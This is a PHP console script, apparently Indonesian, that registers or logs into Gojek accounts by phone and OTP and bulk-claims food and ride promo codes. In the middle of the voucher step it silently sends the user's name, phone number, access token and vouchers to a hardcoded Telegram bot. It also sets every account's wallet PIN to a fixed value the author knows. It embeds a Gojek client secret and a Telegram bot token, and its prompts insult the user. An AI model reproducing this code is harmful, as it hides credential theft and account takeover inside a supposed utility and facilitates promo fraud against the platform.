date_default_timezone_set('Asia/Jakarta');
include "function.php";
echo color("blue","[][][][][][][][][][][][][][][][][][][][][]");
echo color("blue","\n[]  MAKAN MAKAN SLURRRR  []\n");
echo color("blue","[]  Creator : Xizzy404 , EDITOR : AMIGEMASH                  []\n");
echo "[]  Version : V1.1                      []\n";
echo "[]  Time    : ".date('[d-m-Y] [H:i:s]')."   []\n";
echo "[][][][][][][][][][][][][][][][][][][][][]\n\n";

function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        ulang:
        echo color("nevy","?] MASUKKIN NOMOR LU DULU GOBLOG : ");
        $no = trim(fgets(STDIN));
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$no.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("green","+] TUNGGUIN KODE OTP NYA Y BGSD")."\n";
        otp:
        echo color("nevy","?] MASUKKIN OTP NYA DISINI YA HEHE : ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("green","+] BERHASIL MENDAFTAR , SIAP SIAP MAKAN SLUR");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo "\n".color("nevy","?] JAWAB " Y " KALO LO MAU VOUCHER MAKAN !: ");
        $pilihan = trim(fgets(STDIN));
        if($pilihan == "y" || $pilihan == "Y"){
        echo color("red","===========(REDEEM VOUCHER SLURRR)===========");
        echo "\n".color("yellow","!] Claim voc 20+10");
        echo "\n".color("yellow","!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBA07"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'ALHAMDULILLAH DAPET SLUR SELAMAT MAKAN ! ')){
        echo "\n".color("green","+] Message: ".$message);
        goto goride;
        }else{
        echo "\n".color("red","-] Message: ".$message);
        echo "\n".color("yellow","!] Claim voc 15+19");
        echo "\n".color("yellow","!] SABAR YA HEHE MAMPUS GA DAPET YANG 20+10");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $boba10 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBA10"}');
        $messageboba10 = fetch_value($boba10,'"message":"','"');
        if(strpos($boba10, 'ALHAMDULILLAH DAPET SLUR SELAMAT MAKAN ! .')){
        echo "\n".color("green","+] Message: ".$messageboba10);
        goto goride;
        }else{
        echo "\n".color("red","-] Message: ".$messageboba10);
        echo "\n".color("yellow","!] Claim voc 10+10");
        echo "\n".color("yellow","!] SABAR YA HEHE MAMPUS GA DAPET YANG 15+10");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $boba19 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODBOBA19"}');
        $messageboba19 = fetch_value($boba19,'"message":"','"');
        if(strpos($boba19, 'ALHAMDULILLAH DAPET SLUR SELAMAT MAKAN ! .')){
        echo "\n".color("green","+] Message: ".$messageboba19);
        goto goride;
        }else{
        echo "\n".color("green","+] Message: ".$messageboba19);
        goride:
        echo "\n".color("yellow","!] Claim voc GO-RIDE 10K");
        echo "\n".color("yellow","!] TUNGGU Y AJG SABAR LAH LO GA SABAR BANGET KAYANYA MAU MAKAN YE GOBLOG");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"AYOCOBAGOJEK"}');
        $message1 = fetch_value($goride,'"message":"','"');
        echo "\n".color("green","+] Message: ".$message1);
        echo "\n".color("yellow","!] Claim voc GO-RIDE 10K KE-2");
        echo "\n".color("yellow","!] TUNGGU Y AJG SABAR LAH LO GA SABAR BANGET KAYANYA MAU MAKAN YE GOBLOG");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $goride1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAINGOJEK"}');
        $message2 = fetch_value($goride1,'"message":"','"');
        echo "\n".color("green","+] Message: ".$message2);
        sleep(3);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        echo "\n".color("yellow","!] Total voucher ".$total." : ");
        echo color("green","1. ".$voucher1);
        echo "\n".color("green","                     2. ".$voucher2);
        echo "\n".color("green","                     3. ".$voucher3);
        echo "\n".color("green","                     4. ".$voucher4);
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
                                        $TOKEN  = "944234975:AAFTWOO0Ymotxj-MsciOnbmC-V_5f5AKL0k";
					$chatid = "889019882";
					$pesan 	= "[+] Gojek Account Info [+]\n\nNama = ".$nama."\nNomer = ".$no."\naccessToken = ".$token."\nTotalVoucher = ".$total."\n1.".$voucher1." exp : [".$expired1."]\n2.".$voucher2." exp : [".$expired2."]\n3.".$voucher3." exp : [".$expired3."]\n4.".$voucher4." exp : [".$expired4."]";
					$method	= "sendMessage";
					$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
					$post = [
 					'chat_id' => $chatid,
 			        	'text' => $pesan
					];
                                        $header = [
                                        "X-Requested-With: XMLHttpRequest",
                                        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
         setpin:
         echo "\n".color("nevy","?]  SEKALIAN SET PIN GA ? GOBLOK: ");
         $pilih1 = trim(fgets(STDIN));
         if($pilih1 == "y" && strpos($no, "628")){
         echo color("red","===============(SET PIN)===============")."\n";
         $data2 = '{"pin":"050203"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo "Otp set pin: ";
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;
         }else if($pilih1 == "n" || $pilih1 == "N"){
         die();
         }else{
         echo color("red","-] NOMOR US KOK PENGEN SET PIN YA GA BISA LAH GOBLOK ! \n");
         }
         }
         }
         }
         }else{
         goto setpin;
         }
         }else{
         echo color("red","-] OTP LO SALAH GOBLOK !");
         echo"\n==================================\n\n";
         echo color("yellow","!] MASUKKIN ULANG TOT \n");
         goto otp;
         }
         }else{
         echo "NOMOR HP LU UDH TERDAFTAR GOBLOK";
         echo "\nMau login? (y/n): ";
         $pilih = trim(fgets(STDIN));
         if($pilih == "y" || $pilih == "Y"){
         echo "\n===============Login================\n";
         echo "Nomer lu: ".$no."\n";
         $datalogin = '{"phone":"+'.$no.'"}';
         $login = request('/v4/customers/login_with_phone', null, $datalogin);
         if(strpos($login, '"login_token"')){
         echo "Kode verifikasi sudah di kirim";
         echo "\nOtp: ";
         $otplogin = trim(fgets(STDIN));
         $logintoken = getStr('"login_token": "','"',$login);
         $datalogin1 = '{"client_name":"gojek:cons:android","client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e","data":{"otp":"'.$otplogin.'","otp_token":"'.$logintoken.'"},"grant_type":"otp","scopes":"gojek:customer:transaction gojek:customer:readonly"}';
         $veriflogin = request('/v4/customers/login/verify', null, $datalogin1);
         echo $veriflogin;
         $token = getStr('"access_token":"','"',$veriflogin);
         $uuid = getStr('"resource_owner_id":',',',$veriflogin);
         $data2 = '{"pin":"050203"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo "Otp set pin: ";
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;;
         }else{
         echo "Error,silahkan mulai dari awal";
         }
         }else{
         echo "\n==============Register==============\n";
         goto ulang;
  }
 }
}
echo change()."\n";